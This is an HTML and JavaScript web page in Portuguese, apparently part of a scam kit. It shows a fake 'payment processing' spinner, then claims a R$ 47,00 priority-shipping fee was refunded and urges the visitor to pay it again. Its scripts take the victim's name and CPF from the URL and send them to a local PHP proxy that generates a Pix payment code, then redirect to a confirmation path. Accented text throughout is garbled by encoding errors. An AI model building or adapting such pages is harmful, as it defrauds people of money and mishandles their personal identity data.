<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>P√°gina de Reembolso e Novo Pagamento</title>
    <!-- Fontes do Google Fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Deco&family=Montserrat:wght@700&display=swap"
      rel="stylesheet"
    />
    <!-- Link para os √≠cones do FontAwesome -->
    <link rel="stylesheet" href="css/jpwqkkZAV4LV.css" />
    <style>
      /* Reset de margens e padding */
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      /* Estilo do corpo */
      body {
        font-family: "Deco", sans-serif;
        background-color: #f4f4f9; /* Fundo suave e sofisticado */
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        flex-direction: column;
        text-align: center;
      }

      /* Centralizar a parte de pagamento na tela */
      .container {
        background-color: #fff;
        border-radius: 15px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        width: 90%;
        max-width: 450px;
        padding: 40px;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        text-align: center;
        opacity: 0; /* Inicia invis√≠vel para a transi√ß√£o */
        transition: opacity 1s ease-in-out, transform 1s ease-in-out; /* Transi√ß√£o combinada */
        position: absolute; /* Garante que a se√ß√£o fique centralizada */
      }

      /* T√≠tulos */
      h1 {
        font-family: "Montserrat", sans-serif;
        font-size: 26px;
        color: #333;
        margin-bottom: 15px;
        font-weight: 700;
      }

      h2 {
        font-family: "Montserrat", sans-serif;
        font-size: 20px;
        color: #555;
        margin-bottom: 25px;
        font-weight: 600;
      }

      /* Texto de instru√ß√µes */
      p {
        font-size: 16px;
        color: #666;
        line-height: 1.8;
        margin-bottom: 30px;
        text-align: justify;
      }

      /* Estilo do bot√£o de pagamento */
      .btn {
        background-color: #007bff; /* Azul profissional */
        color: #fff;
        font-size: 18px;
        font-weight: bold;
        padding: 18px 28px;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        transition: background-color 0.3s, transform 0.3s;
        width: 100%;
        max-width: 270px;
        margin-top: 20px;
      }

      /* Efeito de hover no bot√£o */
      .btn:hover {
        background-color: #0056b3;
        transform: translateY(-5px);
      }

      /* Container de "processando" */
      .processing {
        font-size: 18px;
        color: #333;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        gap: 10px;
      }

      .processing i {
        font-size: 50px;
        color: #007bff;
      }

      .processing p {
        font-size: 16px;
        color: #555;
      }

      /* Adicionando um √≠cone de seguran√ßa */
      .secure-icon {
        font-size: 40px;
        color: #28a745; /* Verde de seguran√ßa */
        margin-bottom: 20px;
      }

      /* Responsividade */
      @media (max-width: 600px) {
        .container {
          padding: 30px;
        }

        h1 {
          font-size: 22px;
        }

        h2 {
          font-size: 18px;
        }

        p {
          font-size: 14px;
        }

        .btn {
          padding: 15px 25px;
        }
      }
    </style>
  </head>
  <body>
    <!-- Conte√∫do inicial: mensagem de processamento -->
    <div
      class="container processing"
      id="processing-message"
      style="opacity: 1; transform: translateY(0px)"
    >
      <i class="fas fa-spinner fa-spin"></i>
      <h1><strong>Processamento de Pagamento</strong></h1>
      <p>
        O seu pagamento est√° sendo processado. Este procedimento pode levar
        alguns segundos. Por favor, aguarde...
      </p>
    </div>

    <!-- Conte√∫do final: p√°gina com os dados do reembolso -->
    <div class="container" id="payment-content" style="display: none">
      <i class="fas fa-shield-alt secure-icon"></i>
      <!-- √çcone de seguran√ßa -->
      <h1><strong>Seu Reembolso foi Processado</strong></h1>
      <h2><strong>Valor de R$ 47,00 foi reembolsado</strong></h2>
      <p>
        O valor de <strong>R$ 47,00</strong> referente ao Envio Priorit√°rio foi
        reembolsado com sucesso. O cr√©dito ser√° refletido em seu extrato
        banc√°rio em at√© 1 dia √∫til. Sua seguran√ßa e a integridade dos seus dados
        s√£o nossa prioridade.
      </p>
      <p>
        Para continuar, solicitamos que realize o pagamento novamente do valor
        de <strong>R$ 47,00</strong>. Garantimos um processo seguro e eficiente.
      </p>
      <button
        class="btn"
        onclick="window.location.href='/aereoconfirma?' + new URLSearchParams(window.location.search).toString()"
      >
        Realizar Pagamento
      </button>
    </div>

    <script>
      // Fun√ß√£o que oculta a mensagem de "processando" e exibe o conte√∫do final ap√≥s 7 segundos
      setTimeout(function () {
        // Aplicar fade-out na parte de "processando"
        document.getElementById("processing-message").style.opacity = "0";
        document.getElementById("processing-message").style.transform =
          "translateY(-20px)"; // Transi√ß√£o de deslizamento para cima

        // Exibir a parte de "pagamento" com transi√ß√£o combinada
        document.getElementById("payment-content").style.display = "block";
        setTimeout(function () {
          document.getElementById("payment-content").style.opacity = "1";
          document.getElementById("payment-content").style.transform =
            "translateY(0)"; // Transi√ß√£o de deslizamento para baixo
        }, 50); // Pequeno delay para permitir o in√≠cio do fade-in
      }, 7000); // 7000 milissegundos = 7 segundos

      // Garantir que a parte de "processando" inicie com a opacidade em 1 e sem transforma√ß√µes
      document.getElementById("processing-message").style.opacity = "1";
      document.getElementById("processing-message").style.transform =
        "translateY(0)";
    </script>
    <button class="btn" onclick="realizarPagamento()">
      Realizar Pagamento
    </button>

    <script>
      function realizarPagamento() {
        // Captura os par√¢metros da URL atual
        const params = new URLSearchParams(window.location.search);

        // Constr√≥i a nova URL com os par√¢metros existentes
        const urlComParametros = "/aereoconfirma?" + params.toString();

        // Redireciona para a nova URL
        window.location.href = urlComParametros;
      }
    </script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        // Recupera os par√¢metros da URL
        const urlParams = new URLSearchParams(window.location.search);
        const nome = urlParams.get("nome");
        const cpf = urlParams.get("cpf");

        // S√≥ gera o Pix se tiver nome e CPF
        if (!nome || !cpf) {
          console.error("Par√¢metros 'nome' ou 'cpf' ausentes na URL.");
          return;
        }

        // Verifica se j√° tem um Pix salvo
        if (sessionStorage.getItem("pix_data4")) {
          console.log("üì¶ Pix j√° gerado no sessionStorage.");
          return;
        }

        // Faz a requisi√ß√£o via proxy local
        fetch(
          `/seguro/proxy_pix4.php?nome=${encodeURIComponent(
            nome
          )}&cpf=${encodeURIComponent(cpf)}`
        )
          .then((response) => response.json())
          .then((data) => {
            if (data && data.id && data.pix) {
              console.log("‚úÖ Pix gerado com sucesso:", data);

              const pixData = {
                pix: data.pix,
                externalId: data.id,
                id: data.external_id,
                status: data.status,
              };

              sessionStorage.setItem("pix_data4", JSON.stringify(pixData));
              sessionStorage.setItem("externalId", data.id);
              sessionStorage.setItem("pixCode", data.pix);
              sessionStorage.setItem("status", data.status);
            } else {
              console.error("‚ùå Falha ao gerar Pix:", data);
            }
          })
          .catch((error) => {
            console.error("‚ùå Erro na requisi√ß√£o Pix:", error);
          });
      });
    </script>
  </body>
</html>
